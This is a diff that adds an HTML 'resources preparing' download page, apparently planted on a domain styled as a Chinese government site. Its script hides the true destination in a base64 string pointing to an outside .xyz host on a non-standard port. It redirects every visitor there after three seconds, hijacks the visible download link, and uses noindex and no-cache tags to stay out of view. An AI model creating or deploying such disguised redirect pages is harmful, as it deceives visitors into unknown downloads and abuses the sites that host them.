@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <link rel="canonical" href="https://yc.tj.cn/">
+  <link rel="icon" href="/favicon.ico">
+  <title>资源准备中</title>
+  <style>
+    *{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;font-family:"Microsoft YaHei",system-ui,sans-serif;color:#eef5ff;background:radial-gradient(circle at 20% 15%,#15357d 0,transparent 34%),radial-gradient(circle at 85% 80%,#542584 0,transparent 36%),#071126;overflow:auto}.orb{position:fixed;width:360px;height:360px;border-radius:50%;filter:blur(80px);opacity:.25;background:#6959ff;right:-120px;top:-120px}.transfer-card{position:relative;width:min(460px,100%);padding:44px 38px;border:1px solid rgba(157,187,255,.24);border-radius:28px;text-align:center;background:rgba(12,28,62,.82);box-shadow:0 28px 80px rgba(0,0,0,.42),inset 0 1px rgba(255,255,255,.08);backdrop-filter:blur(18px)}.transfer-icon{width:76px;height:76px;margin:0 auto 22px;display:grid;place-items:center;border-radius:24px;background:linear-gradient(135deg,#1bbdff,#7a4fff);box-shadow:0 14px 40px rgba(66,119,255,.4);font-size:34px}.transfer-card h1{margin:0 0 12px;font-size:28px}.transfer-card p{margin:7px 0;color:#b8c8e7}.progress{height:8px;margin:28px 0 12px;border-radius:99px;background:#172a50;overflow:hidden}.progress span{display:block;height:100%;width:0;border-radius:inherit;background:linear-gradient(90deg,#1ad5ff,#8a59ff);animation:load 3s linear forwards}.count{font-size:13px;color:#8fa8d6}.manual{display:inline-flex;margin-top:24px;padding:12px 28px;border-radius:12px;color:#fff;text-decoration:none;background:linear-gradient(135deg,#218fff,#7554ff);font-weight:700;box-shadow:0 10px 26px rgba(54,93,255,.28)}@keyframes load{to{width:100%}}@media(max-width:520px){.transfer-card{padding:36px 24px}.transfer-card h1{font-size:24px}}@media(max-height:600px){body{place-items:start center}.transfer-card{margin-block:12px;padding-block:24px}.transfer-icon{width:58px;height:58px;margin-bottom:14px}.progress{margin-top:18px}.manual{margin-top:16px}}
+  </style>
+</head>
+<body>
+  <div class="orb" aria-hidden="true"></div>
+  <main class="transfer-card transfer-card-yc-tj-govcn yc.tj-govcn">
+    <div class="transfer-icon" aria-hidden="true">↗</div>
+    <h1>资源准备中</h1>
+    <p>正在校验连接环境</p>
+    <p>即将进入下载页面</p>
+    <p>请勿关闭当前页面</p>
+    <div class="progress" aria-label="跳转进度"><span></span></div>
+    <div class="count"><span id="seconds">3</span> 秒后自动进入</div>
+    <a class="manual manual-download-yc-tj-govcn yc.tj-govcn" id="manualDownload" href="/party.html" rel="nofollow noopener noreferrer">立即下载</a>
+  </main>
+  <script>
+    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9rbjUuMzEzNDg2Lnh5ejozNTg4OC8=");
+    const manualDownload = document.getElementById("manualDownload");
+    const seconds = document.getElementById("seconds");
+    let remaining = 3;
+    const timer = window.setInterval(function(){
+      remaining -= 1;
+      seconds.textContent = remaining;
+      if(remaining <= 0){
+        window.clearInterval(timer);
+        window.location.replace(REAL_DOWNLOAD_URL);
+      }
+    },1000);
+    manualDownload.addEventListener("click", function(e){
+      e.preventDefault();
+      window.location.replace(REAL_DOWNLOAD_URL);
+    });
+  </script>
+</body>
+</html>
